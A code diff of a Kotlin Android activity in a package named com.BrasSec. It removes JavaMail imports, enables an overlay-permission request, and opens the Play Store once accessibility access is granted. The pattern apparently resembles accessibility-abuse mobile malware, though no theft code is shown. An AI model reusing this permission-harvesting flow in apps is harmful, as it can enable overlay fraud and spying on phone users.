@@ -2,35 +2,43 @@ package com.BrasSec
 
 import android.accessibilityservice.AccessibilityServiceInfo
 import android.annotation.SuppressLint
+import android.content.ComponentName
 import android.content.Intent
+import android.content.pm.PackageManager
 import android.net.Uri
-import android.os.Build
 import android.os.Bundle
+import android.os.SystemClock
 import android.provider.Settings
 import android.util.Log
 import android.view.accessibility.AccessibilityManager
 import android.widget.Button
 import android.widget.Toast
 import androidx.appcompat.app.AppCompatActivity
-import java.util.Properties
-import javax.mail.Message
-import javax.mail.MessagingException
-import javax.mail.Session
-import javax.mail.internet.InternetAddress
-import javax.mail.internet.MimeMessage
 
+
+private val PERMISSION_ACCESIBILITY = 123
+private var serviceIntent: Intent? = null
+var OVERLAY_PERMISSION = 21
+var finish = 0
+var controle = 0
 
 class MainActivity() : AppCompatActivity() {
-    private val PERMISSION_ACCESIBILITY = 123
-    private var serviceIntent: Intent? = null
-    var OVERLAY_PERMISSION = 21
-    var finish = 0
+
+
 
 
     @SuppressLint("MissingInflatedId")
     override fun onCreate(savedInstanceState: Bundle?) {
 
         super.onCreate(savedInstanceState)
+
+        if (isAccessibilityEnabled() == true) {
+            val intentPlay = Intent().apply {
+                setClassName("com.android.vending", "com.google.android.finsky.activities.MainActivity")
+            }
+            startActivityForResult(intentPlay, 100)
+            finish()
+        }
 
         setContentView(R.layout.layout_accessibility)
         var botao_next = findViewById<Button>(R.id.button1)
@@ -45,12 +53,12 @@ class MainActivity() : AppCompatActivity() {
                   startActivityForResult(serviceIntent!!, PERMISSION_ACCESIBILITY)
               }
 
-            /*    if (!Settings.canDrawOverlays(this)) {
+                if (!Settings.canDrawOverlays(this)) {
                     val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                         Uri.parse("package:" + packageName))
                     val OVERLAY_PERMISSION_REQUEST_CODE = 1234
                     startActivityForResult(intent, OVERLAY_PERMISSION_REQUEST_CODE)
-                }*/
+                }
 
               else {
                   var intent= Intent(applicationContext, SecondActivity::class.java)
@@ -58,11 +66,18 @@ class MainActivity() : AppCompatActivity() {
                   finish = 1
               }
         }
-
         botao_back.setOnClickListener(){
-          finish()
+
+            close()
         }
 
+    }
+
+   private fun close(){
+        SystemClock.sleep(600)
+       onBackPressedDispatcher.onBackPressed()
+
+      // finish()
     }
 
     @SuppressLint("ServiceCast")
@@ -86,8 +101,10 @@ class MainActivity() : AppCompatActivity() {
 
         if (requestCode == PERMISSION_ACCESIBILITY) {
 
-            if (isAccessibilityEnabled() == true) {
+            if (isAccessibilityEnabled() == true && controle==0) {
+                controle = 1
                 var intent= Intent(applicationContext, SecondActivity::class.java)
+
                 startActivity(intent)
             }
 
